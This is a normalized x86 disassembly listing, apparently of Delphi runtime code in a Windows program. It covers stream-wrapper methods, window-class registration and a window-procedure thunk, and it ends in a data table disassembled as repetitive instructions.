cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_4197f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407c68
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_419888
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
sub_419888
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4139c8
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407c68
test al al
jne r-xdata
sub_4198d8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4043c8
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407dec
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
xor edx edx
mov eax ebx
call sub_419a58
mov edx esi
mov eax ebx
call sub_419964
mov dl 0x1
mov eax ebx
call sub_419a58
sub_419978
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4139c8
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413954
sub_4199b4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_413a24
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4138b8
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_413a44
sub_419a08
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4199a4
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_419978
mov cl 0x1
mov edx ebx
call sub_419a08
inc edi
dec ebp
jne r-xdata
sub_419a58
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404258
mov edx esp
mov eax esi
call sub_403540
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_419aa0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_419ac8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_419b10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403320
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_419b50
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_419b70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_419b94
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40323c
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_419bdc
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
mov edx esi
call sub_419e0c
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_419c44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_419e0c
mov edx ebx
mov eax esi
call sub_419e00
sub_419c88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419380
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_419ccc
push ebx
push esi
push edi
call sub_4035f8
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4193cc
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_419680
jmp r-xdata
mov eax esi
call sub_413ab0
mov edx eax
mov eax edi
call sub_419e0c
lea eax [ edi + 0x50 ]
call sub_40cd80
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035e0
sub_419d2c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41969c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_419d58
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_419d74
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_419d90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4139c8
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_419e0c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4138b8
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4139c8
cmp ebp eax
jne r-xdata
sub_419e4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_419680
mov edx ebx
call sub_419450
sub_419e78
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40323c
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_419ec0
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_40326c
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_419ef8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_419f47
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419f60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_419faf
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419fc8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a032
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41a04c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a095
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_4156a4
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41a0b0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_40569c
xor eax eax
push ebp
push sub_41a29d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41a276
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026bc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41a265
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403aa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a2a4
lea eax [ ebp + 0xc ]
call sub_405628
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403aa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41a2e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41a343
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a374
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_413d34
mov edi eax
xor eax eax
push ebp
push sub_41a3c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a3d0
mov eax [ rw-data ]
call sub_413d98
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4139c8
call sub_40326c
inc esi
dec ebx
jne r-xdata
sub_41a3e8
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41a410
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028b8
mov edx sub_41a3e8
lea eax [ esi + 0x5 ]
call sub_41a408
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41a408
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41a4cc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_4069c4
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a410
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41a580
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41a4a8
sub_41a5a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41a64c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a653
retn
mov eax [ rw-data ]
call sub_4131b8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41a374
xor edx edx
xor eax eax
call sub_4165a4
mov eax rw-data
call sub_40cd80
call sub_405d58
lea eax [ eax + 0xc ]
call sub_40cd80
mov eax rw-data
call sub_40cd80
mov eax rw-data
call sub_405628
mov eax sub_41a3e0
call sub_4054c4
mov eax rw-data
call sub_40cd80
call sub_4191a0
mov eax rw-data
call sub_40cd80
mov eax rw-data
call sub_405628
sub_41a658
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41a6e1
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a6e8
retn
call sub_41916c
mov eax sub_41a3e0
call sub_4054bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_40cac0
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_405640
mov dl 0x1
mov eax [ r-xdata ]
call sub_412ab4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413bdc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413bdc
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41a6ec
test [ fs : esi ] 0x88
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] cl
test [ esi ] 0x8a
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx + 0x640000ff ] cl
test [ esi ] 0x8c
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp + 0x640000ff ] cl
test [ esi ] 0x8e
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] cl
test [ esi ] 0x70
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx - 0x1 ] dh
add [ eax ] al
test [ fs : esi ] 0x72
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx - 0x1 ] dh
add [ eax ] al
test [ fs : esi ] 0x74
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
test [ fs : esi ] 0x76
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi - 0x1 ] dh
add [ eax ] al
test [ fs : esi ] 0x78
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx - 0x1 ] bh
add [ eax ] al
test [ fs : esi ] 0x7a
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx - 0x1 ] bh
add [ eax ] al
test [ fs : esi ] 0x7c
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
test [ fs : esi ] 0x7e
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi - 0x1 ] bh
add [ eax ] al
test [ fs : esi ] 0x60
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx - 0x1 ] ah
add [ eax ] al
test [ fs : esi ] 0x62
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx - 0x1 ] ah
add [ eax ] al
test [ fs : esi ] 0x64
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
test [ fs : esi ] 0x66
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi - 0x1 ] ah
add [ eax ] al
test [ fs : esi ] 0x68
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx - 0x1 ] ch
add [ eax ] al
test [ fs : esi ] 0x6a
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx - 0x1 ] ch
add [ eax ] al
test [ fs : esi ] 0x6c
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
test [ fs : esi ] 0x6e
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi - 0x1 ] ch
add [ eax ] al
test [ fs : esi ] 0x50
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx - 0x1 ] dl
add [ eax ] al
test [ fs : esi ] 0x52
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx - 0x1 ] dl
add [ eax ] al
test [ fs : esi ] 0x54
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
test [ fs : esi ] 0x56
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi - 0x1 ] dl
add [ eax ] al
test [ fs : esi ] 0x58
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx - 0x1 ] bl
add [ eax ] al
test [ fs : esi ] 0x5a
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx - 0x1 ] bl
add [ eax ] al
test [ fs : esi ] 0x5c
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
test [ fs : esi ] 0x5e
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi - 0x1 ] bl
add [ eax ] al
test [ fs : esi ] 0x40
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx - 0x1 ] al
add [ eax ] al
test [ fs : esi ] 0x42
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx - 0x1 ] al
add [ eax ] al
test [ fs : esi ] 0x44
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
test [ fs : esi ] 0x46
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi - 0x1 ] al
add [ eax ] al
test [ fs : esi ] 0x48
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx - 0x1 ] cl
add [ eax ] al
test [ fs : esi ] 0x4a
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx - 0x1 ] cl
add [ eax ] al
test [ fs : esi ] 0x4c
inc [ eax ]
